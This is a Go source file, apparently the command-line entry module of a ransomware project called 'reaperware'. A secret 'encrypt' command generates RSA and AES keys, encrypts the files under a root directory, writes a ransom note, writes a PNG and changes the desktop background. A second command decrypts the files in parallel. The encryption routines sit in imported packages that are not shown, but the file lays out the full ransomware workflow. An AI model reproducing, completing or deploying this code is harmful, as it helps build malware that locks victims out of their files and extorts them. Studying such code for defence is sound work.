package userinput

import (
	"fmt"
	"log"
	"os"
	"reaperware/pkg/aeskeys"
	"reaperware/pkg/filedirectory"
	"reaperware/pkg/notes"
	"reaperware/pkg/rsakeys"
)

const (
	Encrypt            string = "givemesomeskittlesbutidontwanttopayfordem"
	Decrypt            string = "putthatbaaaaaaaack"
	ExceptionStatement string = "Expected givemesomeskittlesbutidontwanttopayfordem or putthatbaaaaaaaack"
)

func usage() string {
	return fmt.Sprintf(
		"Usage:\n  %s <command>\n\nCommands:\n  %s\n  %s\n",
		os.Args[0],
		Encrypt,
		Decrypt,
	)
}

// Check for user input matches our const, otherwise throw "exception" and exit
func CommandCheck(command string) {
	if command == Encrypt || command == Decrypt {
		return
	} else {
		log.Fatalln(ExceptionStatement)
	}
}

// Parse user commands to execute program
func UserCommands() {
	if len(os.Args) != 2 {
		log.Fatalf("Invalid arguments.\n%s", usage())
	}

	var command string = os.Args[1]

	CommandCheck(command)

	// fs := flag.NewFlagSet(command, flag.ExitOnError)
	switch command {
	case Encrypt:
		log.Println("[+] Encrypting process")
		rootDirectory := filedirectory.RootDir()
		_, rsaPublicKey := rsakeys.CreateRSAKeys()

		aesKey := aeskeys.CreateAESKey(rsaPublicKey)

		filedirectory.EncryptTheFiles(rootDirectory, aesKey)
		notes.WriteANote()
		notes.WriteToPng()
		notes.ChangeBackgroundImage()
		return
	case Decrypt:
		log.Println("[+] Decrypting process")
		rootDirectory := filedirectory.RootDir()
		aesKey := rsakeys.UnencryptedAESKey()

		encryptedFiles := filedirectory.FindTheEncryptedFiles(rootDirectory)

		// Log the number of encrypted files found
		log.Printf("[+] Found %d encrypted files\n", len(encryptedFiles))

		// Decrypt all files in parallel
		numWorkers := 10 // Adjust number of workers as needed
		filedirectory.DecryptFilesInParallel(aesKey, encryptedFiles, numWorkers)

		log.Println("[+] All files decrypted! Check logs to verify no failures")
		return
	default:
		log.Fatalln("[-] Subcommand does not exist")
	}
}
